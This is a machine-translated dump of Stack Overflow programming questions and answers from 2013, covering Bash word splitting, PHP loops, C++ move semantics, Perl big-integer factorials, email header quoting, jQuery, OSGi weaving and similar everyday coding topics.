  ByteArrayInputStream bais = new ByteArrayInputStream(imageFileData);
  Pipe pipeIn = new Pipe(bais, null);
  cmd.setInputProvider(pipeIn);

  // Capture output from stdout into an image.
  Stream2BufferedImage s2b = new Stream2BufferedImage();
  cmd.setOutputConsumer(s2b);

  // Run the command.
  cmd.run(op);

  // Return the resulting image.
  return s2b.getImage();
} 
```

我错过了什么？！

编辑：有趣的是，当我改变

```
op.addImage("gif:-"); // output: stdout 
```

至

```
// Save the file instead of returning the bytes
op.addImage("gif:C:\\Pictures\\thumb.gif"); 
```

图像是用动画正确创建的。

我还发现从 s2b.getImage() 返回的 byte[] 长度只有 4,8777 字节（作为单个图像的 gif），而使用直接文件路径成功创建的 gif thumb 是 190,512 字节，这让我相信问题在于命令/流的某些设置。

# bash - Bash 脚本：解析用逗号分隔的字符串

> ID：15555537
> 
> 赞同：0
> 
> 时间：2013-03-21T18:38:30.377
> 
> 标签：bash

我有一个文件，里面有很多单词，每行一个。我还有第二个文件，其中所有单词都在以逗号分隔的一行。我想要做的是访问以逗号分隔的每个单词。一旦我有了每个单词，我想为第一个文件中的文件删除该单词。

我无法访问分隔文件中的每个单词。

谢谢您的帮助！

* * *

## 回答 #1

> 赞同：1
> 
> 时间：2013-03-21T18:53:50.570

这个怎么样：

```
#!/bin/bash
# split_comma
OIFS=$IFS
IFS=','

for w in $(cat $1)
do
    # Do stuff with each word
    echo $w
done

IFS=$OIFS 
```

* * *

`$ ./split_comma test_file`其中`test_file`包含`this,is,a,test`返回：

```
this
is
a
test 
```

然后，您可以轻松地`grep`从较大的行分隔文件中过滤掉单词。

* * *

## 回答 #2

> 赞同：1
> 
> 时间：2013-03-21T18:56:17.163

尝试这样做：

```
grep -w -v -f <(tr ',' '\n' < 2nd_file) 1st_file 
```

* * *

## 回答 #3

> 赞同：0
> 
> 时间：2013-03-21T18:59:49.737

你可以尝试这样的事情：

```
sed -e 's/,/\n/g' fileWithCommas > tempfile
grep -v -f tempfile wordfile > newfile && mv newfile wordfile
rm tempfile 
```

# php - PHP while循环（mysql_fetch_array）只显示表中的最后一条记录

> ID：15555541
> 
> 赞同：0
> 
> 时间：2013-03-21T18:38:50.660
> 
> 标签：php, mysql, while-loop

这是我的代码：

```
$result = mysql_query ($query) or die (mysql_error());
$row = mysql_fetch_assoc($result);

while($row = mysql_fetch_array( $result )) {

$contactID=$row['contactID'];
$contactFamily =$row ['contactFamily'];
$Contact=$row ['Contact'];
$contactOwner =$row ['contactOwner'];
$Impact=$row ['Impact'];
$Probability =$row ['Probability'];

if ($row ['Impact']=="5" && $row['Probability']=="4")
{
    $grid1=  $row ['contactFamily']." ".$row ['Contact']." .$row['contactOwner'];
}

?>
<br/>
<?php

if ($row ['Impact']=="3" && $row['Probability']=="4")
{
    $grid2=  $row ['contactFamily']." ".$row ['Contact']." .$row['contactOwner'];
}
?>
<br/>
<?

} 
```

问题是当我回显 $grid1 或 $grid2 而不是全部时，它只显示表中的最后一条记录。

请问有人可以帮忙吗？

* * *

## 回答 #1

> 赞同：0
> 
> 时间：2013-03-21T18:49:19.210

You are filling a variable multiple times but it only keeps the last value, that's the reason you always see the last value. I've changed your code using arrays:

```
<?php
$result = mysql_query($query) or die (mysql_error());
$row = mysql_fetch_assoc($result);
$i = 0
while($row = mysql_fetch_array($result)) {
    $data[$i]['contactID'] = $row['contactID'];
    $data[$i]['contactFamily'] = $row['contactFamily'];
    $data[$i]['Contact'] =$row['Contact'];
    $data[$i]['contactOwner'] = $row['contactOwner'];
    $data[$i]['Impact'] = $row['Impact'];
    $data[$i]['Probability'] = $row['Probability'];

    if ($row['Impact'] == "5" && $row['Probability'] =="4") {
        $grid1[$i] = $row['contactFamily'] . " " . $row ['Contact'] . " " . $row['contactOwner'];
    }
    if ($row['Impact']=="3" && $row['Probability']=="4") {
        $grid2[$i] = $row['contactFamily'] . " " . $row ['Contact'] . " " . $row['contactOwner'];
    }
    $i++;
} 
```

* * *

## 回答 #2

> 赞同：0
> 
> 时间：2013-03-21T18:40:22.440

`$grid1`并且`$grid2`需要是一个数组。否则，您每次通过循环时都会覆盖您的值。

```
$grid1 = array();
$grid2 = array();
while($row = mysql_fetch_array( $result )) {

$grid1[] =  $row ['contactFamily']." ".$row ['Contact']." ".$row['contactOwner'];

$grid2[] =  $row ['contactFamily']." ".$row ['Contact']." ".$row['contactOwner']; 
```

* * *

## 回答 #3

> 赞同：0
> 
> 时间：2013-03-21T18:41:47.790

您应该在 while 循环中回显 $grid1 和 $grid2 ，因为每次循环运行时，它们都会被下一个值覆盖。

* * *

## 回答 #4

> 赞同：0
> 
> 时间：2013-03-21T18:42:19.883

每次迭代结果集时，您都在重新分配`$grid1`并`$grid2`使用正在创建的字符串，这就是为什么只显示最后一个结果的原因。你想要做的是使用连接赋值运算符，`.=`例如

```
$grid1 .= $row['contactFamily']." ".$row['Contact']." ".$row['contactOwner']; 
```

# python - python - 多种可能性的“if in”语句

> ID：15555542
> 
> 赞同：0
> 
> 时间：2013-03-21T18:39:00.060
> 
> 标签：python

我想检查问号或点是否在单词的最后位置。所以做类似的事情：

```
if ".","?" in word[-1]: 
```

或者：

```
if [".","?"] in word[-1]: 
```

导致语法无效。这样做的正确方法是什么？（最好没有正则表达式）

* * *

## 回答 #1

> 赞同：3
> 
> 时间：2013-03-21T18:40:22.433

对于这种*特殊*情况，您要检查结尾：

```
if word.endswith(('.','?')): 
```

* * *

## 回答 #2

> 赞同：3
> 
> 时间：2013-03-21T18:40:28.337

你把顺序倒过来了。

```
if word[-1] in ".?": 
```

请参阅[文档](http://docs.python.org/3/library/stdtypes.html#sequence-types-list-tuple-range)`in`中的操作员

# java - OSGi WeavingHook 示例

> ID：15555545
> 
> 赞同：12
> 
> 时间：2013-03-21T18:39:05.033
> 
> 标签：java, osgi, aop, aspectj, load-time-weaving

有人有使用 OSGi 4.3+ Weaving Hook Service 的例子吗？AspectJ、ASM、JavaAssist 怎么样？有人真的在使用 OSGi WeavingHooks 吗？

OSGi Core 5.0.0 第 56.2 节中的示例简单地省略了实际的编织，并说“最终的编织留给读者作为练习”。

我的目标是：

1.  创建一个可以放在字段（基元或对象）上的注释（@MyAnnotation）。
2.  创建一个 org.osgi.framework.hooks.weaving.WeavingHook 以使用该注释编织类
3.  使用加载时编织来切入具有该注释的字段的任何修改
4.  触发字段被修改的 EventAdmin 事件。
5.  动态更新来自 WeavingHook 的包连接以连接到 EventAdmin 包。

我的问题主要是#3。

我目前正在尝试使用 AspectJ [WeavingAdaptor](http://eclipse.org/aspectj/doc/released/weaver-api/org/aspectj/weaver/tools/WeavingAdaptor.html)进行编织，但是在将方面库放入其中时遇到问题，因为它期望构造函数中的*java.net.URL[] aspectURLs*是罐子或目录它可以在文件系统上找到，而不是捆绑包。另外，我不确定如何通过回调到 GeneratedClassHandler 的*acceptClass(String name, bytes[])*方法来处理编织器[生成](http://www.eclipse.org/aspectj/doc/next/weaver-api/org/aspectj/weaver/tools/GeneratedClassHandler.html)的任何新类。

也许 WeavingAdaptor 不是开始编织的正确位置？或者也许我不应该使用 AspectJ？

**MyAnnotation.java**

```
@Target(ElementType.FIELD)
@Retention(RetentionPolicy.RUNTIME)
public @interface MyAnnotation {
} 
```

**MyWeavingHook.java**

```
public class MyWeavingHook implements WeavingHook {

    public class MyWeavingClassloader implements WeavingClassLoader {

        private Bundle b;

        public MyWeavingClassLoader(Bundle b) {
            this.b = b;
        }

        void acceptClass(java.lang.String name, byte[] bytes) {
            //no way to get this back into the woven classes bundle classloader?
        } 

        URL[] getAspectURLs() {
            //how do I get a handle to my aspect library that AspectJ can understand?
        }
    }

    public void weave(WovenClass myclass) {
        Bundle b = Framework.getBundle(MyWeavingHook.class);
        WeavingClassLoader wc = new WeavingClassLoader(b);
        WeavingAdaptor w = new WeavingAdaptor(wc);
        if (shouldWeave(myclass))
          myclass.setBytes(w.weave(myClass.getBytes()));
        //should catch exceptions
    }

    private boolean shouldWeave(WovenClass myclass) {
        //not sure of the best logic to pick which classes to weave yet
    }
} 
```

**我的方面.aj**

```
privileged aspect MyAspect {
    after() : set(* *) && @annotation(MyAnnotation) {
      //send EventAdmin event
    }
} 
```

**MyTestClass.java**

```
public class MyTestClass {
    @MyAnnotation
    private int myField;

    public void doSomething() {
      //do stuff with myField
    }
} 
```

我可以使用 Spring AOP，但我希望它适用于任何包，而不仅仅是通过 Spring 或 Blueprint 实例化的 bean。此外，Equinox Weaving 似乎还没有使用 OSGi 编织钩子规范，我不想被 Equinox 束缚。如果其他方法效果更好，我可以毫无问题地废弃 AspectJ。

参考一个类似的问题：[使用 OSGi 时是否可以进行字节码操作？](https://stackoverflow.com/questions/563305/is-it-possible-to-do-bytecode-manipulation-when-using-osgi)

更新：

最终结果是我刚刚使用 Equinox Aspects 并将其安装到 Karaf 中。是 3 个捆绑包、一个库和一个系统属性。我会一直使用它，直到他们将它更新为我们的 OSGi 编织，或者我编写自己的 OSGi 编织钩子以使用类似于 Equinox Aspects 的 AspectJ 代码。我不喜欢让 Equinox Aspects 工作所需的编织指标，因为它在要编织的包中的 AspectJ RT 上引入了 require-bundle/reexport 或 import-package。应该在捆绑包之外动态添加和建议此依赖项。

* * *

## 回答 #1

> 赞同：2
> 
> 时间：2013-04-08T08:54:55.927

看看Apache Aries 的 Proxy 模块中的[ProxyWeavingHook](https://github.com/apache/aries/blob/trunk/proxy/proxy-impl/src/main/java/org/apache/aries/proxy/impl/weaving/ProxyWeavingHook.java)。它直接使用 ASM 库来修改字节码，使其更底层。

* * *

## 回答 #2

> 赞同：0
> 
> 时间：2013-05-24T06:52:39.477

WeavingAdaptor 期望您的 WeavingClassLoader 从 URLClassLoader 派生，因此两个可用的构造函数最终基本上做同样的事情。[查看http://www.slideshare.net/mfrancis/bytecode-weaving](http://www.slideshare.net/mfrancis/bytecode-weaving)以了解如何利用BundleWiring来访问类路径 URL。您可以将 AspectJ 运行时包添加到 wovenClass.getDynamic'Imports() 以避免直接 AspectJ 引用。BundleWiring 也是为 WeavingAdaptor 提供 AspectJ url 的方式。

我认为没有办法支持来自 acceptClass 的新类，因为编织钩子指出动态导入只能在编织方法内部使用。

# c++ - 编译器会在 setter 方法中自动应用移动语义吗？

> ID：15555549
> 
> 赞同：4
> 
> 时间：2013-03-21T18:39:12.813
> 
> 标签：c++, c++11, compiler-optimization, move-semantics, copy-elision

我想知道是否允许编译器在以下 setter 方法中自动使用 wstring 的移动构造函数（无需显式调用 std::move）：

```
void SetString(std::wstring str)
{
    m_str = str;  // Will str be moved into m_str automatically or is std::move(str) needed?
} 
```

从我读过的内容来看，似乎不允许编译器做出这个决定，因为 str 是一个左值，但很明显在这里使用 move 不会改变程序行为。

除非移动，是否会应用其他类型的复制省略？

* * *

## 回答 #1

> 赞同：3
> 
> 时间：2013-03-21T19:13:12.110

> [是] 编译器 [...] 允许自动使用移动构造函数

是的，那会很好。但这不仅是一种优化，而且对语言有真正的影响。

考虑一个只移动类型，如`unique_ptr`：

```
std::unique_ptr<int> f()
{
  std::unique_ptr<int> up;
  return up; // this is ok although unique_ptr is non-copyable.
} 
```

假设您的规则将包含在 C++ 标准中，称为“参数最后出现”的规则。

```
void SetString(std::unique_ptr<int> data)
{
    m_data = data; // this must be ok because this is "argument's last occurence"
} 
```

检查返回中是否使用了标识符很容易。检查它是否是“参数的最后一次出现”不是。

```
void SetString(std::unique_ptr<int> data)
{
    if (condition) {
      m_data = data; // this is argument's last occurence
    } else {
      data.foo();
      m_data = data; // this is argument's last occurence too
    }
    // many lines of code without access to data
} 
```

这也是有效的代码。所以每个编译器都需要检查“参数的最后一次出现”，这不是一件容易的事。为此，他必须扫描整个函数以确定第一行是否有效。如果您必须向下滚动 2 页来检查这一点，作为人类也很难推理。

不，编译器不允许在 C++11 中使用。而且他可能不会在未来的标准中被允许，因为这个特性通常很难在编译器中实现，它只是为用户提供方便。

* * *

## 回答 #2

> 赞同：1
> 
> 时间：2013-03-21T18:41:28.513

不，这里不会使用移动语义，因为 str 可以在下一个代码中使用，事实上即使它是右值你仍然必须 std::move 强制它..如果你想使用移动语义，我建议你得到wstring&& str 到函数，然后使用 move..

* * *

## 回答 #3

> 赞同：1
> 
> 时间：2013-03-21T19:14:46.010

不，不允许编译器。由于一些原因，不仅仅是因为它很难做到。我认为复制和移动可能会产生副作用，您需要知道何时可以使用它们。例如，众所周知，返回一个本地对象会移动它——你期望，它被记录在案，是可以的。

所以，我们有以下几种可能：

你的例子：

```
void SetString(std::wstring str)
{
     m_str = str;  
} 
```

对于 r-values：一个 r-ref in `str`，加上一个 into 的副本`m_str`。对于 l 值： 中的副本 中`str`的副本`m_str`。

我们可以手动“做得更好”：

```
void SetString( std::wstring str)
{
     m_str = std::move(str);  
} 
```

对于 r 值：一个 r-ref in `str`，加上一个 move into `m_str`。对于 l 值：`str`a move in 中的副本`m_str`。

如果出于某种原因（您希望它在不更改 C++11 的情况下编译，但在移植代码时自动利用 C++11？）您不希望“手动优化”您可以执行的代码：

```
void SetString(const std::wstring& str)
{
     m_str = str;  
} 
```

对于 r 值：一个参考 in `str`，加上一个副本 into `m_str`。对于 l 值： 中`str`的副本中的引用`m_str`。从不 2 副本。

# unix - xlc：在 aix 6.1 上找不到

> ID：15555550
> 
> 赞同：1
> 
> 时间：2013-03-21T18:39:16.443
> 
> 标签：unix, aix, xlc

在 websphere MQ/java/lib/jdbc>make oracle 的安装路径上，出现以下错误

```
xlc: not found 
```

我不确定我的机器上是否安装了 xlc。我的机器是 AIX 6.1。但我可以在我的机器上找到 xlcpp。如何进行？有没有办法创建开关文件？

如果我执行`$ /usr/ccs/lib/cpp -help`

我正进入（状态

```
1506-173 (W) Option help is not valid. Enter xlc for list of valid options. 
```

如何进行？

* * *

## 回答 #1

> 赞同：2
> 
> 时间：2013-03-21T20:53:43.943

/usr/ccs/lib/cpp 不是用于 AIX 编译器的 XL C/C++，它是作为 AIX 的一部分提供的 C 预处理器。XL C/C++ for AIX 编译器是一个单独的许可程序产品，必须单独购买其许可。

如果您安装了 XL C/C++ for AIX，您会发现系统上安装了 /usr/vac/bin/xlc 和 /usr/vacpp/bin/xlc++ 命令。您还可以使用 lslpp 命令检查文件集 vac.C 和 vacpp.cmp.core：

lslpp -L vac.C vacpp.cmp.core

* * *

## 回答 #2

> 赞同：0
> 
> 时间：2013-03-22T02:11:11.370

Dwayne 基本上是对的，但我相信 xlc++ 也有一个 xlc 版本。我在你的另一个问题中看到你有 xlcpp 所以也许你需要做的就是将 /usr/vacpp/bin 添加到你的 PATH 中。

我也倾向于将 grep 与 lslpp 一起使用：

```
lslpp -ch | grep vac 
```

应该告诉你安装了哪些 xlc、xlcpp 等。

高温高压

# jquery - 单击 DIV 或其子项时 Jquery 可拖动

> ID：15555555
> 
> 赞同：2
> 
> 时间：2013-03-21T18:39:37.750
> 
> 标签：jquery, jquery-ui, jquery-ui-draggable, jquery-draggable

是否可以在鼠标单击 div 的子级并让它拖动父级时启用拖动？

在此示例中，我试图让可拖动对象同时适用于 div 和 select。当您单击选择并尝试拖动时，没有任何反应。

[http://jsfiddle.net/Trhs4/5/](http://jsfiddle.net/Trhs4/5/)

```
<div id="draggable" class="ui-widget-content">
<select>
<option>Drag Me</option>
</select>
</div>

 $(function() {
     $( "#draggable" ).draggable();
 }); 
```

* * *

## 回答 #1

> 赞同：1
> 
> 时间：2013-03-22T06:38:25.543

这是一个例子：`[**LIVE DEMO**](http://jsfiddle.net/Trhs4/31/)`

它与您的组合框不太兼容，因为它捕获鼠标单击事件以显示其选项，但它正在工作。

```
$(document).ready(function(){
      var click = false,
      top = null,
      left = null;

    $(document).bind('mousemove', function (e) {
        if (click == true) {
           $('#draggable').css({
             left: e.pageX - left,
             top: e.pageY - top
           });
        }
    });

    $('#draggable').draggable().click(function(e) {
        top = e.pageY - $('#draggable').position().top; 
        left = e.pageX - $('#draggable').position().left;
        click = !click;
        return false;
    });

    $('html').click(function() {
        click = false;
    });
}); 
```

* * *

## 回答 #2

> 赞同：0
> 
> 时间：2013-03-21T18:48:01.493

我认为这是不可能的，因为选择如何与不同的浏览器一起工作。您可以使用 UL 和 LI 构建您自己的选择。

或者，您可以在用户可以选择隐藏的选择上方添加 [拖动我]。<--无论如何，这对用户来说更友好。

* * *

## 回答 #3

> 赞同：0
> 
> 时间：2013-03-21T19:01:03.320

我认为这是不可能的，因为事件处理程序。`<option>`有自己的事件处理程序，因此它可以防止从 JQuery 触发拖放事件。您可以尝试其他对象，例如`<ul>`and `<li>`。请看一下这个示例：[jquery sample](http://jqueryui.com/sortable/#empty-lists)

# java - 用 for ¿ 覆盖值创建 FloatBuffer 数组？

> ID：15555557
> 
> 赞同：1
> 
> 时间：2013-03-21T18:39:40.593
> 
> 标签：java, floatbuffer

我正在使用这样的 for 循环创建一个 FloatBuffers 数组：

```
FloatBuffer[] buffer = new FloatBuffer[sizebuffer];

float[] farray = new float[sizeArray];

for(int i=0;i<sizebuffer;i++){
    for(int j=0;j<sizeArray;j++){

     farray[j]= I get the float values from other buffer....
    }

    buffer[i]= FloatBuffer.wrap(farray);  (*)

} 
```

但由于某种原因，每次执行此行 (*) 时，它都会更改 FloatBuffer 数组（“缓冲区”）每一行的值。例如，在给buffer[0]它的值之后，我打印了buffer[0].get(0)，然后在给buffer[1]它的值之后，我再次打印了buffer[0].get(0)，但是值已更改。它正在处理以前每个缓冲区 [0]、缓冲区 [1] 上的每个新缓冲区 [i] 的值...我不明白为什么会这样？

* * *

## 回答 #1

> 赞同：1
> 
> 时间：2013-03-21T18:43:00.560

该`FloatBuffer.wrap`方法有效地保留了传递给它的数组。因此，您所有的缓冲区都将以您最后在 for 循环中处理的任何值结束。避免此问题的一种简单但相对昂贵的方法是在`System.arraycopy`将数组包装到每个缓冲区之前对其进行处理。

老实说，`put`当您从外部源读取浮点值时，您应该只使用其中一种方法将浮点值设置到缓冲区中。

```
for(int i=0;i<sizebuffer;i++){
    for(int j=0;j<sizeArray;j++){
        farray[j]= some value from other buffer....
    }

    buffer[i]= FloatBuffer.allocate(farray.length);
    buffer[i].put(farray);
} 
```

* * *

## 回答 #2

> 赞同：0
> 
> 时间：2013-03-21T18:43:24.333

这就是JavaDOC中所说的

公共静态 FloatBuffer wrap(float[] 数组)

```
Wraps a float array into a buffer.

The new buffer will be backed by the given float array; that is, **modifications to the buffer will cause the array to be modified and vice versa.** The new buffer's capacity and limit will be array.length, its position will be zero, and its mark will be undefined. Its backing array will be the given array, and its array offset will be zero.

Parameters:
    array - The array that will back this buffer 
Returns:
    The new float buffer 
```

# vb.net - 从 VB.NET 中的 List(Of T) 引发事件

> ID：15555558
> 
> 赞同：5
> 
> 时间：2013-03-21T18:39:41.990
> 
> 标签：vb.net

我已经将一个大型 VB6 移植到 VB.NET 项目，虽然它可以正确编译，但我不得不注释掉大多数事件处理程序，以避开没有用于 winform 对象的数组集合，因此将各种对象放入分别在集合数组中放入一个List对象。

例如，在 VB6 中，您可以有一个 Button 数组。在我的代码中，我有

```
Dim WithEvents cmdButtons As New List(Of Button) 
```

（并且在 Load 事件中，传播列表）

显然，您不能在容器上触发事件。有没有办法从容器的内容（具有不同的名称）中触发事件？

在按钮创建代码中，事件名称在那里，但据我了解，处理程序不会拦截，因为代码的句柄部分不存在（注释掉）。

* * *

## 回答 #1

> 赞同：5
> 
> 时间：2013-03-21T19:17:07.930

我不确定您要做什么，但是如果您希望能够将事件处理程序添加到容器中的某些按钮并在列表中引用这些按钮，您可以执行类似的操作

```
Public Class Form1

    Dim myButtons As List(Of Button)

    Private Sub AddButtonsToList(targetContainer As Control)
        myButtons = New List(Of Button)

        For Each c In targetContainer.Controls
            If TypeOf c Is Button Then
                Dim bn = DirectCast(c, Button)
                AddHandler bn.Click, AddressOf SomeButton_Click
                myButtons.Add(bn)
            End If
        Next
    End Sub

    Private Sub SomeButton_Click(sender As Object, e As EventArgs)
        Dim bn = DirectCast(sender, Button)
        MsgBox("You clicked " & bn.Name)
    End Sub

    Private Sub Form1_Load(sender As Object, e As EventArgs) Handles MyBase.Load
        ' GroupBox1 has some Buttons in it
        AddButtonsToList(GroupBox1)
    End Sub

End Class 
```

# email - 如何格式化包含逗号的电子邮件“发件人”标头

> ID：15555563
> 
> 赞同：33
> 
> 时间：2013-03-21T18:40:03.293
> 
> 标签：email, email-headers

格式化“发件人”电子邮件标题的标准方法是

```
From: John Doe <john.doe@example.com> 
```

但是，如果名称中有逗号怎么办？

```
From: John Doe, chief bottle washer <john.doe@example.com> 
```

如果我这样做，我的 MTA 会自动将其转换为：

```
From: John@this.server.com, Doe@this.server.com, chief bottle washer <john.doe@example.com> 
```

我的第一个猜测是在全名周围使用双引号，但我找不到任何官方文档证实这一点，我希望所有电子邮件客户都能阅读我的电子邮件。

* * *

## 回答 #1

> 赞同：31
> 
> 时间：2013-03-25T01:31:16.677

要详细说明@Fls'Zen 的答案，是的，正确的方法是将名称括在双引号中。

从实际的角度来看，将所有名称都用双引号括起来并没有什么害处，只要确保在显示名称中出现双引号`\"`（或者只用单引号替换）就转义它。但是，如果您想完全遵守规范，则不必使用双引号。

对于所有密集的细节，电子邮件标题字段由[RFC 5322](https://www.rfc-editor.org/rfc/rfc5322)定义。From 标头中多个发起者的相关部分是[3.6.2](https://www.rfc-editor.org/rfc/rfc5322#section-3.6.2)，引用分隔符的相关部分是[3.2.1](https://www.rfc-editor.org/rfc/rfc5322#section-3.2.1)和[3.2.4](https://www.rfc-editor.org/rfc/rfc5322#section-3.2.4)。

* * *

## 回答 #2

> 赞同：4
> 
> 时间：2017-07-06T12:49:34.687

当[以下正则表达式匹配](https://www.rfc-editor.org/rfc/rfc5322#section-3.2.3)时，必须引用电子邮件显示地址。

```
[^-A-Za-z0-9!#$%&'*+/=?^_`{|}~\s] 
```

对于 ASCII 字符，这可以通过使用反斜杠转义任何双引号字符并将字符串括在双引号中来完成。对于非 ASCII 字符，需要更复杂的[MIME 转义](https://www.rfc-editor.org/rfc/rfc2047)。

* * *

## 回答 #3

> 赞同：3
> 
> 时间：2013-03-21T18:45:06.943

电子邮件标题字段由[RFC 5322](https://www.rfc-editor.org/rfc/rfc5322)定义。`From`标头中多个发起者的相关部分是[3.6.2](https://www.rfc-editor.org/rfc/rfc5322#section-3.6.2)。引用分隔符的相关部分是[3.2.1](https://www.rfc-editor.org/rfc/rfc5322#section-3.2.1)和[3.2.4](https://www.rfc-editor.org/rfc/rfc5322#section-3.2.4)。

# jquery - Rails：如何在不同环境中使用 jQuery 重定向到根页面？

> ID：15555567
> 
> 赞同：1
> 
> 时间：2013-03-21T18:40:10.507
> 
> 标签：jquery, ruby-on-rails

我的 rails 应用程序被称为`submission` 我在我的代码中使用这一行来重定向到我的应用程序索引页面：

```
window.location = "/" 
```

它正在工作，因为我的索引页是`http://localhost:3000/`

但是在我将我的应用程序部署到tomcat之后，

url 更改，索引页面变为：`http://localhost:8080/submission/`

所以 jquery 代码总是将我重定向到`http://localhost:8080/`哪个是 tomcat 索引页面而不是应用程序索引页面。

为了重定向到正确的索引页面，我需要在 jquery 代码中进行哪些更改？

ps 我不想将代码更改为，`window.location = "/submission"`因为有时应用程序名称可能会更改。

* * *

## 回答 #1

> 赞同：2
> 
> 时间：2013-03-21T18:45:43.583

您必须将应用程序根输出到页面上的标签，以便您可以通过 JS/jQuery 查询它。您可以在页面上有一个元标记

```
<meta name='app_root' content='/submission'/> 
```

然后有类似的东西

```
window.location = $('meta[name="app_root"]').attr('content'); 
```

* * *

## 回答 #2

> 赞同：2
> 
> 时间：2013-03-21T18:49:26.537

我没试过，但你不能用`window.location = "<%=root_url%>";`吗？

**编辑**

显然，这仅适用于`.erb`动态文件，而不适用于静态文件。要在静态文件中使用它，请在布局中设置一个全局变量来设置上下文/根。

```
<script>var root_url = "<%=root_url%>"</script> 
```

一旦你初始化了它，你就可以在任何你想要的地方使用它。

# asp.net - 数据表排序不起作用c#

> ID：15555568
> 
> 赞同：0
> 
> 时间：2013-03-21T18:40:13.743
> 
> 标签：asp.net, c#-4.0

我有一组如下模式的值

* * *

> 名称： 颜色： 百分比：

我需要按百分比顺序对这些数据进行排序

现在我正在使用数据表 DefaultView 排序方法

```
//declare columns
DataTable dt = new DataTable();
dt.Columns.Add("name");
dt.Columns.Add("color");
dt.Columns.Add("percentage");

//adding rows
DataRow dr = dt.NewRow();
dr["name"]="a";
dr["color"]="red";
dr["percentage"]="10.1";
dt.Rows.Add(dr);

//sorting
dt.DefaultView.Sort="percentage desc"; 
```

当相同的数字[百分比]重复更多次时，问题就来了，知道错误在哪里吗？

* * *

## 回答 #1

> 赞同：2
> 
> 时间：2013-03-21T18:45:24.227

更改此代码：

```
dt.Columns.Add("percentage"); 
```

对此：

```
dt.Columns.Add("percentage", typeof(double)); 
```

* * *

## 回答 #2

> 赞同：1
> 
> 时间：2013-03-21T19:49:55.947

正如多人指出的那样，因为您将百分比添加为字符串（“10.1”），它将被排序为字符串。这意味着，由于您按降序排序，因此“2”将出现在您的排序中的“10.1”之上。这是因为字符串值是逐个字符比较的，并且“2”在字母降序排序中位于“1”之前。

这就是你说的问题吗？如果是这样，其他任何一种建议的解决方案都对您有用。

您还说“当相同的数字 [百分比] 重复更多次时，问题就来了`percentage`”

```
dt.DefaultView.Sort="percentage desc, name asc, color asc"; 
```

# perl - 用所有数字计算 100 阶乘

> ID：15555573
> 
> 赞同：7
> 
> 时间：2013-03-21T18:40:27.163
> 
> 标签：perl, factorial, bigint

我遇到了计算*100 factorial*的问题。

这是我首先在*Perl*中尝试计算**100 的方法！**：

```
#!/usr/bin/perl

use strict;
use warnings;
use Math::BigInt;

my $n=<>;
chomp($n);
print fac($n);

sub fac
{
    my ($m) = @_;

    return 1 if($m <=1 );
    return $m*fac($m-1);
} 
```

但这是给我`9.33262154439441e+157`的。

我需要所有数字的答案。

我该怎么办？

* * *

## 回答 #1

> 赞同：12
> 
> 时间：2013-03-21T18:46:03.523

双精度数（大多数 Perls 使用）只有约 16 位精度。您需要使用另一个系统来获得所需的 158 位精度。

```
use bigint; 
```

这将导致 Perl 自动将脚本中的所有数字视为`Math::BigInt`对象。

如果您需要更好的控制（将某些`BigInt`数字视为浮点数，将某些数字视为浮点数），请参阅 Krishnachandra Sharma 的解决方案并明确使用`Math::BigInt`构造函数。

`Math::BigInt`顺便说一下，有一个内置的阶乘函数：

```
$ perl -MMath::BigInt -e 'print Math::BigInt->bfac(100)'
93326215443944152681699238856266700490715968264381621468592963895217599993229915608941463976156518286253697920827223758251185210916864000000000000000000000000 
```

* * *

## 回答 #2

> 赞同：6
> 
> 时间：2013-03-21T18:40:27.163

双精度数（大多数 Perls 使用）只有约 16 位精度。您需要另一个系统来获得所需的 158 位精度。尝试使用[`Math::BigInt`](http://perldoc.perl.org/Math/BigInt.html).

这是代码。

```
#!/usr/bin/perl

use strict;
use warnings;
use Math::BigInt;

my $n=100;
Math::BigInt->new($n);
print fac($n);

sub fac
{
    my ($m) = @_;

    return 1 if($m <=1 );
    return Math::BigInt->new($m*fac($m-1));
} 
```

生产`9332621544394415268169923e266700490715968264381621468592963895217599993229915608941463976156518286253697920827223758251185210916864000000000000000000000000`

* * *

## 回答 #3

> 赞同：0
> 
> 时间：2015-10-16T12:04:32.103

根据定义，`bigint`通过重载整数和浮点文字的处理，将它们转换为 Math::BigInt 对象来工作。因此，在简单`for`循环的帮助下，我们可以实现非常大整数的阶乘。

```
use bigint;

my $fact = 1;

for my $n (1..100) {    
    $fact *= $n;
}

print "Factorial: \n", $fact , "\n"; 
```

这会产生以下输出：

```
Factorial: 933262154439441526816992388562667004907159682643816214685929638952175
99993229915608941463976156518286253697920827223758251185210916864000000000000000
000000000 
```

而像这样的普通程序会颤抖而没有有意义的输出

```
use integer;

my $fact = 1;

for my $n (1..100) {    
    $fact *= $n;
}

print "Factorial: \n", $fact , "\n"; 
```

输出：

```
Factorial:
0 
```

# vb.net - 在while循环中Do Loop until和not运算符之间的区别？

> ID：15555579
> 
> 赞同：-1
> 
> 时间：2013-03-21T18:40:46.117
> 
> 标签：vb.net

```
Dim n As Integer

Do Until n > 5
   n = n + 10
Loop
Debug.WriteLine(n) 
```

VS

```
Dim n As Integer

While Not n > 5
   n = n + 10
End While
Debug.WriteLine(n) 
```

输出：10（两者都有）

* * *

## 回答 #1

> 赞同：0
> 
> 时间：2013-03-21T18:47:24.017

不同之处在于 the`Not`是一个额外的运算符。结果是一样的。

您可以对运算符的补码执行相同`>`操作，这样您就不再需要一个运算符了：

```
While n <= 5
  n = n + 10
End While 
```

你也可以这样做`Do While`：

```
Do While n <= 5
  n = n + 10
Loop 
```

该`Do ... Loop`构造更灵活，您可以在循环的任一端使用`While`或使用。可以做任何可以做的事情，它主要是为了向后兼容`Until`而保留的。`Do ... Loop``While`

# javascript - 自定义 Extjs 4+ 字段结构的最佳方式

> ID：15555585
> 
> 赞同：1
> 
> 时间：2013-03-21T18:40:56.963
> 
> 标签：javascript, extjs, field, custom-component

我对自定义 Extjs 触发字段很感兴趣，我想知道执行以下操作的最佳方法是什么（请原谅文本图）（方括号代表元素）：

```
[field label] [trigger element] [button] 
```

它基本上是一个触发器字段，其末尾附加了一个小按钮。我希望只是扩展触发字段，并可能通过 fieldSubTpl 添加按钮，即：

```
fieldSubTpl: [
    '<input id="{id}" type="{type}" ',
        '<tpl if="name">name="{name}" </tpl>',
        '<tpl if="size">size="{size}" </tpl>',
        '<tpl if="tabIdx">tabIndex="{tabIdx}" </tpl>',
        'class="{fieldCls} {typeCls}" autocomplete="off" />',
    '<div id="{cmpId}-triggerWrap" class="{triggerWrapCls}" role="presentation">',
        '{triggerEl}',
        '{buttonEl}',  <--- New Button Element
        '<div class="{clearCls}" role="presentation"></div>',
    '</div>',
    {
        compiled: true,
        disableFormats: true
